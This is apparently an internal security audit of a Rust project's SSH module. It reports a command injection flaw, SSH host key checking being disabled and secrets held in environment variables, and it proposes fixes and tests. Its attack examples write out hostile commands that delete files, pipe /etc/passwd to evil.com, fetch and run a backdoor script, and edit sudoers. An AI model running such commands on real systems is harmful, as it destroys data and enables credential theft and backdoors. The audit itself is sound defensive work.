# TEAM-109: Critical Security Findings

**Date:** 2025-10-18  
**Auditor:** TEAM-109  
**Status:** 🔴 PRODUCTION BLOCKED

---

## Executive Summary

**CRITICAL SECURITY VULNERABILITY FOUND**

During audit of Units 3 & 4, TEAM-109 discovered a **command injection vulnerability** in the SSH module that allows arbitrary command execution on remote hosts.

**Impact:** Complete system compromise  
**Severity:** CRITICAL (CVSS 9.8)  
**Status:** BLOCKS PRODUCTION DEPLOYMENT

---

## 🔴 CRITICAL #1: Command Injection in SSH Module

### Location

**File:** `bin/queen-rbee/src/ssh.rs`  
**Function:** `execute_remote_command()`  
**Line:** 79

### Vulnerability Details

**Problem:** User-controlled `command` parameter is passed directly to SSH without validation or sanitization:

```rust
pub async fn execute_remote_command(
    host: &str,
    port: u16,
    user: &str,
    key_path: Option<&str>,
    command: &str,  // ← User-controlled input
) -> Result<(bool, String, String)> {
    let mut cmd = Command::new("ssh");
    
    // ... SSH options ...
    
    cmd.arg(format!("{}@{}", user, host))
        .arg(command)  // ← LINE 79: DANGEROUS - No validation!
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    
    let output = cmd.output().await?;
    // ...
}
```

### Attack Vectors

**Example 1: File Deletion**
```rust
execute_remote_command(
    "workstation.home.arpa",
    22,
    "vince",
    None,
    "echo test; rm -rf /important/data"
)
// Executes: ssh vince@workstation.home.arpa "echo test; rm -rf /important/data"
```

**Example 2: Data Exfiltration**
```rust
execute_remote_command(
    "workstation.home.arpa",
    22,
    "vince",
    None,
    "cat /etc/passwd | curl -X POST https://evil.com/steal -d @-"
)
// Steals password file
```

**Example 3: Backdoor Installation**
```rust
execute_remote_command(
    "workstation.home.arpa",
    22,
    "vince",
    None,
    "curl https://evil.com/backdoor.sh | bash"
)
// Downloads and executes malicious script
```

**Example 4: Privilege Escalation**
```rust
execute_remote_command(
    "workstation.home.arpa",
    22,
    "vince",
    None,
    "echo 'vince ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
)
// Grants sudo access without password
```

### Why This Is Critical

1. **No Input Validation** - Command parameter is not validated
2. **No Sanitization** - Special characters (`;`, `&&`, `|`, etc.) not escaped
3. **Shell Execution** - SSH executes commands in a shell on remote host
4. **High Privileges** - Runs as the SSH user (often has sudo access)
5. **Remote Execution** - Can compromise multiple machines

### Impact Assessment

**Confidentiality:** HIGH - Can read any file accessible to SSH user  
**Integrity:** HIGH - Can modify/delete any file accessible to SSH user  
**Availability:** HIGH - Can crash systems, delete data, install ransomware

**CVSS Score:** 9.8 (CRITICAL)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low
- User Interaction: None
- Scope: Changed
- Confidentiality Impact: High
- Integrity Impact: High
- Availability Impact: High

### Affected Code Paths

**Direct Callers:**
1. `bin/queen-rbee/src/http/beehives.rs` - HTTP API endpoint
2. Any future code that calls `execute_remote_command()`

**Potential Attack Surface:**
- HTTP API `/v1/beehives/{node}/execute` (if exists)
- CLI commands that execute remote commands
- Any automation that uses this function

---

## Required Fixes

### Fix Option 1: Command Whitelist (Recommended)

**Pros:** Simple, secure, explicit  
**Cons:** Less flexible

```rust
pub enum AllowedCommand {
    Test,
    BuildRelease,
    Status,
    RestartService,
}

impl AllowedCommand {
    fn to_command_string(&self) -> &'static str {
        match self {
            Self::Test => "echo 'connection test'",
            Self::BuildRelease => "cargo build --release --bin rbee-hive",
            Self::Status => "systemctl status rbee-hive",
            Self::RestartService => "systemctl restart rbee-hive",
        }
    }
}

pub async fn execute_remote_command(
    host: &str,
    port: u16,
    user: &str,
    key_path: Option<&str>,
    command: AllowedCommand,  // ← Type-safe enum instead of string
) -> Result<(bool, String, String)> {
    let command_str = command.to_command_string();
    
    let mut cmd = Command::new("ssh");
    // ... SSH options ...
    cmd.arg(format!("{}@{}", user, host))
        .arg(command_str)  // ← Safe: from whitelist
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    
    let output = cmd.output().await?;
    Ok((output.status.success(), stdout, stderr))
}
```

### Fix Option 2: Structured Commands (Best)

**Pros:** Most secure, type-safe, flexible  
**Cons:** More code

```rust
pub enum RemoteCommand {
    Test,
    Build {
        binary: String,
        features: Vec<String>,
    },
    SystemCtl {
        action: SystemCtlAction,
        service: String,
    },
}

pub enum SystemCtlAction {
    Start,
    Stop,
    Restart,
    Status,
}

impl RemoteCommand {
    fn to_args(&self) -> Vec<String> {
        match self {
            Self::Test => vec!["echo".into(), "connection test".into()],
            
            Self::Build { binary, features } => {
                let mut args = vec!["cargo".into(), "build".into(), "--release".into()];
                args.push("--bin".into());
                args.push(binary.clone());
                if !features.is_empty() {
                    args.push("--features".into());
                    args.push(features.join(","));
                }
                args
            }
            
            Self::SystemCtl { action, service } => {
                let action_str = match action {
                    SystemCtlAction::Start => "start",
                    SystemCtlAction::Stop => "stop",
                    SystemCtlAction::Restart => "restart",
                    SystemCtlAction::Status => "status",
                };
                vec!["systemctl".into(), action_str.into(), service.clone()]
            }
        }
    }
    
    fn to_shell_command(&self) -> String {
        use shellwords::escape;
        self.to_args()
            .iter()
            .map(|arg| escape(arg))
            .collect::<Vec<_>>()
            .join(" ")
    }
}

pub async fn execute_remote_command(
    host: &str,
    port: u16,
    user: &str,
    key_path: Option<&str>,
    command: RemoteCommand,  // ← Type-safe structured command
) -> Result<(bool, String, String)> {
    let command_str = command.to_shell_command();
    
    // Log the command for audit trail
    tracing::info!(
        host = %host,
        user = %user,
        command = %command_str,
        "Executing remote command"
    );
    
    let mut cmd = Command::new("ssh");
    // ... SSH options ...
    cmd.arg(format!("{}@{}", user, host))
        .arg(command_str)  // ← Safe: properly escaped
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    
    let output = cmd.output().await?;
    Ok((output.status.success(), stdout, stderr))
}
```

### Fix Option 3: Shell Escaping (Least Secure)

**Pros:** Flexible  
**Cons:** Still risky, easy to get wrong

```rust
use shellwords::escape;

pub async fn execute_remote_command(
    host: &str,
    port: u16,
    user: &str,
    key_path: Option<&str>,
    command: &str,
) -> Result<(bool, String, String)> {
    // Validate command doesn't contain dangerous patterns
    if command.contains(';') || command.contains('|') || command.contains('&') {
        anyhow::bail!("Command contains dangerous characters");
    }
    
    // Escape the command
    let safe_command = escape(command);
    
    let mut cmd = Command::new("ssh");
    // ... SSH options ...
    cmd.arg(format!("{}@{}", user, host))
        .arg(safe_command.as_ref())  // ← Escaped
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    
    let output = cmd.output().await?;
    Ok((output.status.success(), stdout, stderr))
}
```

**⚠️ NOT RECOMMENDED:** Shell escaping is error-prone and can still be bypassed.

---

## Additional Security Issues in ssh.rs

### Issue #2: StrictHostKeyChecking=no

**Line:** 34, 74

```rust
.arg("-o")
.arg("StrictHostKeyChecking=no")  // ← Vulnerable to MITM attacks
```

**Problem:** Disables SSH host key verification  
**Impact:** Man-in-the-middle attacks possible  
**Fix:** Remove this option or make it configurable

### Issue #3: No Command Logging

**Problem:** No audit trail of executed commands  
**Impact:** Cannot detect or investigate attacks  
**Fix:** Add structured logging:

```rust
tracing::warn!(
    host = %host,
    user = %user,
    command = %command,
    "Executing remote SSH command"
);
```

### Issue #4: No Rate Limiting

**Problem:** No protection against brute force or DoS  
**Impact:** Can be used to overwhelm remote systems  
**Fix:** Add rate limiting per host

---

## Testing the Fix

### Test 1: Whitelist Enforcement

```rust
#[tokio::test]
async fn test_command_whitelist() {
    // Should work
    let result = execute_remote_command(
        "localhost",
        22,
        "test",
        None,
        AllowedCommand::Test,
    ).await;
    assert!(result.is_ok());
    
    // Should fail (not in whitelist)
    // This test no longer compiles - good!
    // execute_remote_command("localhost", 22, "test", None, "rm -rf /");
}
```

### Test 2: Injection Prevention

```rust
#[tokio::test]
async fn test_injection_prevention() {
    // Structured commands prevent injection
    let cmd = RemoteCommand::Build {
        binary: "rbee-hive; rm -rf /".to_string(),  // Attempt injection
        features: vec![],
    };
    
    let command_str = cmd.to_shell_command();
    
    // Should be properly escaped
    assert!(!command_str.contains("rm -rf"));
    assert!(command_str.contains("rbee-hive\\;"));  // Escaped semicolon
}
```

### Test 3: Audit Logging

```rust
#[tokio::test]
async fn test_command_logging() {
    // Set up log capture
    let logs = capture_logs();
    
    execute_remote_command(
        "localhost",
        22,
        "test",
        None,
        AllowedCommand::Test,
    ).await.unwrap();
    
    // Verify command was logged
    assert!(logs.contains("Executing remote SSH command"));
    assert!(logs.contains("command=\"echo 'connection test'\""));
}
```

---

## Deployment Blockers

### Before Production Deployment

- [ ] Fix command injection vulnerability (Option 1 or 2)
- [ ] Remove `StrictHostKeyChecking=no` or make configurable
- [ ] Add command logging for audit trail
- [ ] Add rate limiting
- [ ] Add integration tests for security
- [ ] Security review of fix
- [ ] Penetration testing

### Estimated Fix Time

- **Option 1 (Whitelist):** 2-3 hours
- **Option 2 (Structured):** 4-6 hours
- **Option 3 (Escaping):** 1-2 hours (NOT RECOMMENDED)

**Recommended:** Option 2 (Structured Commands) - 4-6 hours

---

## 🔴 CRITICAL #2: Secrets in Environment Variables

**Status:** Known from Units 1 & 2 audit

**Files Affected:**
- `bin/queen-rbee/src/main.rs` (line 56)
- `bin/rbee-hive/src/commands/daemon.rs` (line 64)
- `bin/llm-worker-rbee/src/main.rs` (line 252)

**Issue:** API tokens loaded from environment variables instead of files

**Impact:** Tokens visible in process listings, shell history, /proc

**Fix:** See Units 1 & 2 audit report for detailed fix

---

## Production Readiness Status

### Current Status: 🔴 BLOCKED

**Blockers:**
1. 🔴 Command injection in ssh.rs (CRITICAL)
2. 🔴 Secrets in environment variables (CRITICAL)

**Must Fix Before Production:**
- Both critical issues must be resolved
- Security review of fixes
- Integration testing
- Penetration testing

**Estimated Time to Production Ready:**
- Fix command injection: 4-6 hours
- Fix secret loading: 4 hours (from Units 1 & 2)
- Testing: 4 hours
- **Total:** 12-14 hours (2 days)

---

**Created by:** TEAM-109  
**Date:** 2025-10-18  
**Status:** Critical vulnerabilities documented

**DO NOT DEPLOY TO PRODUCTION until these issues are fixed.**
